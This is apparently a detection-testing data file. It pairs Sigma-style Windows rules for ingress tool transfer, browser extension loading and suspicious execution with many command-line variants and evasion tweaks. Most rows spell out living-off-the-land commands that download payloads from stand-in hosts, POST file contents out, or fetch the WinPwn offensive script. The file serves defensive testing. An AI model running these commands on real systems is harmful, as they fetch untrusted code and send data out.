Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1105	proc_creation_win_desktopimgdownldr_remote_file_download	Remote File Download Via Desktopimgdownldr Utility	214641c2-c579-4ecb-8427-0cf19df6842e		desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe /dest:C:\\Temp\\payload.exe	FALSE	FALSE	FALSE	
t1105	proc_creation_win_desktopimgdownldr_remote_file_download	Remote File Download Via Desktopimgdownldr Utility	214641c2-c579-4ecb-8427-0cf19df6842e		desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe /dest:C:/Temp/payload.exe	FALSE	FALSE	FALSE	
t1105	proc_creation_win_desktopimgdownldr_susp_execution	Suspicious Desktopimgdownldr Command	bb58aa4a-b80b-415a-a2c0-2f65a4c81009		desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe /eventName:desktopimgdownldr	FALSE	FALSE	FALSE	
t1105	proc_creation_win_desktopimgdownldr_susp_execution	Suspicious Desktopimgdownldr Command	bb58aa4a-b80b-415a-a2c0-2f65a4c81009		desktopimgdownldr.exe -lockscreenurl:http://example.com/payload.exe /eventName:desktopimgdownldr	FALSE	FALSE	FALSE	
t1105	proc_creation_win_desktopimgdownldr_susp_execution	Suspicious Desktopimgdownldr Command	bb58aa4a-b80b-415a-a2c0-2f65a4c81009		desktopimgdownldr.exe /lockscreenurl:http://example.com/payload.exe?bypass=.jpg /eventName:desktopimgdownldr	FALSE	FALSE	FALSE	
t1105	proc_creation_win_gfxdownloadwrapper_arbitrary_file_download	Arbitrary File Download Via GfxDownloadWrapper.EXE	eee00933-a761-4cd0-be70-c42fe91731e7		GfxDownloadWrapper.exe https://gameplayapi.intel.com/legitfile.exe	FALSE	FALSE	FALSE	
t1105	proc_creation_win_gfxdownloadwrapper_arbitrary_file_download	Arbitrary File Download Via GfxDownloadWrapper.EXE	eee00933-a761-4cd0-be70-c42fe91731e7		"GfxDownloadWrapper.exe ""https://gameplayapi.intel.com/legitfile.exe"""	FALSE	FALSE	FALSE	
t1105	proc_creation_win_gfxdownloadwrapper_arbitrary_file_download	Arbitrary File Download Via GfxDownloadWrapper.EXE	eee00933-a761-4cd0-be70-c42fe91731e7		GfxDownloadWrapper.exe https://gameplayapi.intel.com/legitfile.exe\	FALSE	FALSE	FALSE	
t1105	proc_creation_win_gfxdownloadwrapper_arbitrary_file_download	Arbitrary File Download Via GfxDownloadWrapper.EXE	eee00933-a761-4cd0-be70-c42fe91731e7		GfxDownloadWrapper.exe https://gameplayapi.intel.com/legitfile.exe # comment	FALSE	FALSE	FALSE	
t1105	proc_creation_win_gup_download	File Download Using Notepad++ GUP Utility	44143844-0631-49ab-97a0-96387d6b2d7c		GUP.exe -unzipTo C:\Temp h t t p : / / example.com/payload.zip	FALSE	FALSE	FALSE	
t1105	proc_creation_win_gup_download	File Download Using Notepad++ GUP Utility	44143844-0631-49ab-97a0-96387d6b2d7c		GUP.exe -unzipTo=C:\Temp https://example.com/payload.zip	FALSE	FALSE	FALSE	
t1105	proc_creation_win_gup_download	File Download Using Notepad++ GUP Utility	44143844-0631-49ab-97a0-96387d6b2d7c		"GUP.exe -unzipTo=C:\Temp ""h t t p : / / example.com/payload.zip"""	FALSE	FALSE	FALSE	
t1105	proc_creation_win_gup_download	File Download Using Notepad++ GUP Utility	44143844-0631-49ab-97a0-96387d6b2d7c		GUP.exe -unzipTo=C:\Temp $env:url	FALSE	FALSE	FALSE	
t1105	proc_creation_win_gup_download	File Download Using Notepad++ GUP Utility	44143844-0631-49ab-97a0-96387d6b2d7c		GUP.exe -unzipTo=C:\Temp http://example.com/payload.zip	FALSE	FALSE	FALSE	
t1105	proc_creation_win_ieexec_download	File Download And Execution Via IEExec.EXE	9801abb8-e297-4dbf-9fbd-57dde0e830ad		IEExec.exe https://example.com/payload.exe	FALSE	FALSE	FALSE	
t1105	proc_creation_win_ieexec_download	File Download And Execution Via IEExec.EXE	9801abb8-e297-4dbf-9fbd-57dde0e830ad		IEExec.exe http://example.com/payload.exe	FALSE	FALSE	FALSE	
t1105	proc_creation_win_ieexec_download	File Download And Execution Via IEExec.EXE	9801abb8-e297-4dbf-9fbd-57dde0e830ad		IEExec.exe -url https://example.com/payload.exe	FALSE	FALSE	FALSE	
t1105	proc_creation_win_ieexec_download	File Download And Execution Via IEExec.EXE	9801abb8-e297-4dbf-9fbd-57dde0e830ad		IEExec.exe \\?\C:\\IEExec.exe https://example.com/payload.exe	FALSE	FALSE	FALSE	
t1105	proc_creation_win_ieexec_download	File Download And Execution Via IEExec.EXE	9801abb8-e297-4dbf-9fbd-57dde0e830ad		IEExec.exe https://example.com/payload.exe > NUL	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_diantz_remote_cab	Suspicious Diantz Download and Compress Into a CAB File	185d7418-f250-42d0-b72e-0c8b70661e93		diantz.exe payload.exe C:\Windows\Tasks\archive.cab	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_diantz_remote_cab	Suspicious Diantz Download and Compress Into a CAB File	185d7418-f250-42d0-b72e-0c8b70661e93		diantz.exe payload.exe C:\Windows\Tasks\archive.cab.txt	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_diantz_remote_cab	Suspicious Diantz Download and Compress Into a CAB File	185d7418-f250-42d0-b72e-0c8b70661e93		diantz.exe payload.exe C:\Windows\Tasks\archive.cab\	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_diantz_remote_cab	Suspicious Diantz Download and Compress Into a CAB File	185d7418-f250-42d0-b72e-0c8b70661e93		diantz.exe payload.exe C:\Windows\Tasks\archive.cab -v	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_diantz_remote_cab	Suspicious Diantz Download and Compress Into a CAB File	185d7418-f250-42d0-b72e-0c8b70661e93		diantz.exe payload.exe C:\Windows\Tasks\archive.cab /v	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_extrac32	Suspicious Extrac32 Execution	aa8e035d-7be4-48d3-a944-102aec04400d		extrac32.exe /C \\127.0.0.1\share\archive.zip C:\path\to\extract\file.txt	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_extrac32	Suspicious Extrac32 Execution	aa8e035d-7be4-48d3-a944-102aec04400d		extrac32.exe /c C:\path\to\source.cab C:\path\to\destination.txt	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_extrac32	Suspicious Extrac32 Execution	aa8e035d-7be4-48d3-a944-102aec04400d		extrac32.exe /E /A \\127.0.0.1\share\archive.cab C:\path\to\extract\	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_printbrm	PrintBrm ZIP Creation of Extraction	cafeeba3-01da-4ab4-b6c4-a31b1d9730c7		"PrintBrm.exe -f ""C:\Users\Public\data.zip"" -b"	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_printbrm	PrintBrm ZIP Creation of Extraction	cafeeba3-01da-4ab4-b6c4-a31b1d9730c7		PrintBrm.exe -fC:\Users\Public\data.zip -b	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_printbrm	PrintBrm ZIP Creation of Extraction	cafeeba3-01da-4ab4-b6c4-a31b1d9730c7		PrintBrm.exe -f C:\Users\Public\data.zip	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_printbrm	PrintBrm ZIP Creation of Extraction	cafeeba3-01da-4ab4-b6c4-a31b1d9730c7		PrintBrm.exe -f:C:\Users\Public\data.zip -b	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_printbrm	PrintBrm ZIP Creation of Extraction	cafeeba3-01da-4ab4-b6c4-a31b1d9730c7		PrintBrm.exe -f C:\Users\Public\data.7z	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_printbrm	PrintBrm ZIP Creation of Extraction	cafeeba3-01da-4ab4-b6c4-a31b1d9730c7		set ZIP_PATH=C:\Users\Public\data.zip && PrintBrm.exe -f %ZIP_PATH% -b	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_printbrm	PrintBrm ZIP Creation of Extraction	cafeeba3-01da-4ab4-b6c4-a31b1d9730c7		PrintBrm.exe -b -f C:\Users\Public\data.zip	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_replace	Replace.exe Usage	9292293b-8496-4715-9db6-37028dcda4b3		"C:\Windows\System32\replace.exe ""C:\AtomicRedTeam\atomics\T1105\src\redcanary.cab"" C:\Users\thaim\AppData\Local\Temp /A"	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_replace	Replace.exe Usage	9292293b-8496-4715-9db6-37028dcda4b3		"C:\Windows\System32\replace.exe ""\\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\redcanary.cab"" C:\Users\thaim\AppData\Local\Temp /A"	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_replace	Replace.exe Usage	9292293b-8496-4715-9db6-37028dcda4b3		replace.exe payload.exe C:\target\directory	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_replace	Replace.exe Usage	9292293b-8496-4715-9db6-37028dcda4b3		replace.exe payload.exe C:\target\directory /A	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_replace	Replace.exe Usage	9292293b-8496-4715-9db6-37028dcda4b3		"C:\Windows\System32\replace.exe ""C:\AtomicRedTeam\atomics\T1105\src\redcanary.cab"" C:\Users\thaim\AppData\Local\Temp -a"	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_replace	Replace.exe Usage	9292293b-8496-4715-9db6-37028dcda4b3		"C:\Windows\System32\replace.exe ""C:\AtomicRedTeam\atomics\T1105\src\redcanary.cab"" C:\Users\thaim\AppData\Local\Temp /A /V"	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_replace	Replace.exe Usage	9292293b-8496-4715-9db6-37028dcda4b3		"C:\Windows\System32\replace.exe ""C:\AtomicRedTeam\atomics\T1105\src\redcanary.cab"" C:\Users\thaim\AppData\Local\Temp /A /R"	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_replace	Replace.exe Usage	9292293b-8496-4715-9db6-37028dcda4b3		"C:\Windows\System32\replace.exe ""C:\AtomicRedTeam\atomics\T1105\src\redcanary.cab"" C:\Users\thaim\AppData\Local\Temp /A /S"	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_replace	Replace.exe Usage	9292293b-8496-4715-9db6-37028dcda4b3		"C:\Windows\System32\replace.exe ""C:\AtomicRedTeam\atomics\T1105\src\redcanary.cab"" C:\Users\thaim\AppData\Local\Temp /A /F"	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_susp_certreq_download	Suspicious Certreq Command to Download	4480827a-9799-4232-b2c4-ccc6c4e9e12b		"certreq.exe -Post -config ""http://example.com"" C:\windows\win.ini C:\Users\thaim\AppData\Local\Temp\Atomic-license.txt"	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_susp_certreq_download	Suspicious Certreq Command to Download	4480827a-9799-4232-b2c4-ccc6c4e9e12b		certreq.exe /Post /config http://example.com C:\windows\win.ini	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_susp_certreq_download	Suspicious Certreq Command to Download	4480827a-9799-4232-b2c4-ccc6c4e9e12b		certreq.exe -Post -config http://example.com C:\windows\win.ini	FALSE	FALSE	FALSE	
t1105	proc_creation_win_lolbin_susp_certreq_download	Suspicious Certreq Command to Download	4480827a-9799-4232-b2c4-ccc6c4e9e12b		certreq.exe -config http://example.com -Post C:\windows\win.ini	FALSE	FALSE	FALSE	
t1105	proc_creation_win_powershell_invoke_webrequest_direct_ip	Suspicious Invoke-WebRequest Execution With DirectIP	1edff897-9146-48d2-9066-52e8d8f80a2f		"powershell.exe -Command ""& {Invoke-WebRequest -Uri http://127.0.0.1 -Method POST -Body (Get-Content C:\Windows\System32\notepad.exe)}"""	FALSE	FALSE	FALSE	
t1105	proc_creation_win_powershell_invoke_webrequest_direct_ip	Suspicious Invoke-WebRequest Execution With DirectIP	1edff897-9146-48d2-9066-52e8d8f80a2f		"powershell.exe -Command ""& {for($i=0; $i -le 1000; $i++) { (Invoke-WebRequest 'https://8.8.8.8/resolve?name=atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT' -UseBasicParsing).Content }}"""	FALSE	FALSE	FALSE	
t1105	proc_creation_win_powershell_invoke_webrequest_direct_ip	Suspicious Invoke-WebRequest Execution With DirectIP	1edff897-9146-48d2-9066-52e8d8f80a2f		"powershell.exe -Command ""& {iwr -Uri http://127.0.0.1 -Method POST -Body (Get-Content C:\Windows\System32\notepad.exe)}"""	FALSE	FALSE	FALSE	
t1105	proc_creation_win_powershell_invoke_webrequest_direct_ip	Suspicious Invoke-WebRequest Execution With DirectIP	1edff897-9146-48d2-9066-52e8d8f80a2f		"powershell.exe -Command ""& {for($i=0; $i -le 1000; $i++) { (iwr 'https://8.8.8.8/resolve?name=atomicredteam.$(Get-Random -Minimum 1 -Maximum 999999).127.0.0.1.xip.io&type=TXT' -UseBasicParsing).Content }}"""	FALSE	FALSE	FALSE	
t1105	proc_creation_win_powershell_invoke_webrequest_download	Suspicious Invoke-WebRequest Execution	5e3cc4d8-3e68-43db-8656-eaaeefdec9cc		"powershell.exe -Command ""Invoke-WebRequest -Uri http://127.0.0.1 -OutFile C:\Users\Public\safe.txt"""	FALSE	FALSE	FALSE	
t1105	proc_creation_win_powershell_invoke_webrequest_download	Suspicious Invoke-WebRequest Execution	5e3cc4d8-3e68-43db-8656-eaaeefdec9cc		"powershell.exe -c ""iwr -URI https://example.com -OutFile C:\Users\Public\example.txt"""	FALSE	FALSE	FALSE	
t1105	proc_creation_win_powershell_invoke_webrequest_download	Suspicious Invoke-WebRequest Execution	5e3cc4d8-3e68-43db-8656-eaaeefdec9cc		"powershell.exe -Command ""wget -Uri https://example.com -OutFile C:\Users\Public\example.txt"""	FALSE	FALSE	FALSE	
t1105	proc_creation_win_powershell_invoke_webrequest_download	Suspicious Invoke-WebRequest Execution	5e3cc4d8-3e68-43db-8656-eaaeefdec9cc		"powershell.exe -Command ""Invoke-WebRequest -Uri https://example.com -OutFile C:\Users\Public\example.txt"""	FALSE	FALSE	FALSE	
t1105	proc_creation_win_powershell_invoke_webrequest_download	Suspicious Invoke-WebRequest Execution	5e3cc4d8-3e68-43db-8656-eaaeefdec9cc		"powershell.exe -Command ""Invoke-WebRequest -Uri https://example.com -OutFile C:\Users\Public\example.txt -Method GET"""	FALSE	FALSE	FALSE	
t1176.001	proc_creation_win_browsers_chromium_load_extension	Chromium Browser Instance Executed With Custom Extension	88d6e60c-759d-4ac1-a447-c0f1466c2d21		"chrome.exe --load-extension=""C:\Users\user\AppData\Local\Temp\HHe2lr"""	FALSE	FALSE	FALSE	
t1176.001	proc_creation_win_browsers_chromium_load_extension	Chromium Browser Instance Executed With Custom Extension	88d6e60c-759d-4ac1-a447-c0f1466c2d21		chrome.exe --load-extension=C:\Users\user\AppData\Local\Temp\HHe2lr	FALSE	FALSE	FALSE	
t1176.001	proc_creation_win_browsers_chromium_load_extension	Chromium Browser Instance Executed With Custom Extension	88d6e60c-759d-4ac1-a447-c0f1466c2d21		chrome.exe --load-extension=\?\C:\Users\user\AppData\Local\Temp\HHe2lr	FALSE	FALSE	FALSE	
t1176.001	proc_creation_win_browsers_chromium_load_extension	Chromium Browser Instance Executed With Custom Extension	88d6e60c-759d-4ac1-a447-c0f1466c2d21		"chrome.exe --load-extension=""C:\\Users\\user\\AppData\\Local\\Temp\\HHe2lr"""	FALSE	FALSE	FALSE	
t1176.001	proc_creation_win_browsers_chromium_load_extension	Chromium Browser Instance Executed With Custom Extension	88d6e60c-759d-4ac1-a447-c0f1466c2d21		chrome.exe --load-extension=$env:TEMP\HHe2lr	FALSE	FALSE	FALSE	
t1176.001	proc_creation_win_browsers_chromium_susp_load_extension	Suspicious Chromium Browser Instance Executed With Custom Extension	27ba3207-dd30-4812-abbf-5d20c57d474e		"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --load-extension=""C:\Users\user\AppData\Local\Temp\HHe2lr"""	FALSE	FALSE	FALSE	
t1176.001	proc_creation_win_browsers_chromium_susp_load_extension	Suspicious Chromium Browser Instance Executed With Custom Extension	27ba3207-dd30-4812-abbf-5d20c57d474e		"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --load-extension=C:\Users\user\AppData\Local\Temp\HHe2lr"	FALSE	FALSE	FALSE	
t1176.001	proc_creation_win_browsers_chromium_susp_load_extension	Suspicious Chromium Browser Instance Executed With Custom Extension	27ba3207-dd30-4812-abbf-5d20c57d474e		C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe --load-extension=C:\\Users\\user\\AppData\\Local\\Temp\\HHe2lr	FALSE	FALSE	FALSE	
execution	proc_creation_win_browsers_chromium_mockbin_abuse	Chromium Browser Headless Execution To Mockbin Like Site	1c526788-0abe-4713-862f-b520da5e5316		"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --headless=new --disable-gpu https://mockbin.org/bin/31b1332f-8f5c-490e-8ec0-78e77b4e5709"	FALSE	FALSE	FALSE	
execution	proc_creation_win_browsers_chromium_mockbin_abuse	Chromium Browser Headless Execution To Mockbin Like Site	1c526788-0abe-4713-862f-b520da5e5316		"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --headless=new --disable-gpu https://run.mocky.io/12345678-90ab-cdef-ghij-klmnopqrstuv"	FALSE	FALSE	FALSE	
execution	proc_creation_win_browsers_chromium_mockbin_abuse	Chromium Browser Headless Execution To Mockbin Like Site	1c526788-0abe-4713-862f-b520da5e5316		"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --headless=new --disable-gpu https://mockbin.org/bin/31b1332f-8f5c-490e-8ec0-78e77b4e5709?test=1"	FALSE	FALSE	FALSE	
execution	proc_creation_win_browsers_chromium_mockbin_abuse	Chromium Browser Headless Execution To Mockbin Like Site	1c526788-0abe-4713-862f-b520da5e5316		"""C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"" --headless=new --disable-gpu https://mockbin.org/bin/31b1332f-8f5c-490e-8ec0-78e77b4e5709#fragment"	FALSE	FALSE	FALSE	
execution	proc_creation_win_curl_cookie_hijacking	Potential Cookies Session Hijacking	5a6e1e16-07de-48d8-8aae-faa766c05e88		curl.exe --cookie-jar cookie http://example.com	FALSE	FALSE	FALSE	
execution	proc_creation_win_curl_cookie_hijacking	Potential Cookies Session Hijacking	5a6e1e16-07de-48d8-8aae-faa766c05e88		"curl.exe -c cookie ""http://example.com"""	FALSE	FALSE	FALSE	
execution	proc_creation_win_curl_cookie_hijacking	Potential Cookies Session Hijacking	5a6e1e16-07de-48d8-8aae-faa766c05e88		curl.exe --cookie-jar=cookie http://example.com	FALSE	FALSE	FALSE	
execution	proc_creation_win_curl_custom_user_agent	Curl Web Request With Potential Custom User-Agent	85de1f22-d189-44e4-8239-dc276b45379b		curl.exe -H 'User-Agent: EvilAgent' http://example.com	FALSE	FALSE	FALSE	
execution	proc_creation_win_curl_custom_user_agent	Curl Web Request With Potential Custom User-Agent	85de1f22-d189-44e4-8239-dc276b45379b		"curl.exe -H ""User-Agent: EvilAgent"" http://example.com"	FALSE	FALSE	FALSE	
execution	proc_creation_win_curl_custom_user_agent	Curl Web Request With Potential Custom User-Agent	85de1f22-d189-44e4-8239-dc276b45379b		curl.exe -H User-Agent:EvilAgent http://example.com	FALSE	FALSE	FALSE	
execution	proc_creation_win_curl_custom_user_agent	Curl Web Request With Potential Custom User-Agent	85de1f22-d189-44e4-8239-dc276b45379b		curl.exe -H User-Agent: EvilAgent http://example.com	FALSE	FALSE	FALSE	
execution	proc_creation_win_curl_custom_user_agent	Curl Web Request With Potential Custom User-Agent	85de1f22-d189-44e4-8239-dc276b45379b		curl.exe --header 'User-Agent: EvilAgent' http://example.com	FALSE	FALSE	FALSE	
execution	proc_creation_win_curl_download_direct_ip_exec	File Download From IP URL Via Curl.EXE	9cc85849-3b02-4cb5-b371-3a1ff54f2218		curl -o hello.txt https://12.34.56.78/hack/evil.txt	FALSE	FALSE	FALSE	
execution	proc_creation_win_curl_download_direct_ip_exec	File Download From IP URL Via Curl.EXE	9cc85849-3b02-4cb5-b371-3a1ff54f2218		"curl --output hello.txt ""https://12.34.56.78/hack/evil.txt"""	FALSE	FALSE	FALSE	
execution	proc_creation_win_curl_download_direct_ip_exec	File Download From IP URL Via Curl.EXE	9cc85849-3b02-4cb5-b371-3a1ff54f2218		curl --output hello.txt https://12.34.56.78/hack/evil.txt	FALSE	FALSE	FALSE	
execution	proc_creation_win_curl_download_direct_ip_susp_extensions	Suspicious File Download From IP Via Curl.EXE	5cb299fc-5fb1-4d07-b989-0644c68b6043		curl -O 'https://12.34.56.78/hack/evil.hta'	FALSE	FALSE	FALSE	
execution	proc_creation_win_curl_download_direct_ip_susp_extensions	Suspicious File Download From IP Via Curl.EXE	5cb299fc-5fb1-4d07-b989-0644c68b6043		curl --remote-name https://12.34.56.78/hack/evil.hta	FALSE	FALSE	FALSE	
execution	proc_creation_win_curl_download_direct_ip_susp_extensions	Suspicious File Download From IP Via Curl.EXE	5cb299fc-5fb1-4d07-b989-0644c68b6043		curl -o evil.hta https://12.34.56.78/hack/evil.hta	FALSE	FALSE	FALSE	
execution	proc_creation_win_curl_download_direct_ip_susp_extensions	Suspicious File Download From IP Via Curl.EXE	5cb299fc-5fb1-4d07-b989-0644c68b6043		curl --output=evil.hta https://12.34.56.78/hack/evil.hta	FALSE	FALSE	FALSE	
execution	proc_creation_win_curl_download_direct_ip_susp_extensions	Suspicious File Download From IP Via Curl.EXE	5cb299fc-5fb1-4d07-b989-0644c68b6043		curl --output evil.hta https://12.34.56.78/hack/evil.hta	FALSE	FALSE	FALSE	
execution	proc_creation_win_curl_download_susp_file_sharing_domains	Suspicious File Download From File Sharing Domain Via Curl.EXE	56454143-524f-49fb-b1c6-3fb8b1ad41fb		"curl --output ""https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1"""	FALSE	FALSE	FALSE	
execution	proc_creation_win_curl_download_susp_file_sharing_domains	Suspicious File Download From File Sharing Domain Via Curl.EXE	56454143-524f-49fb-b1c6-3fb8b1ad41fb		curl -O https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1	FALSE	FALSE	FALSE	
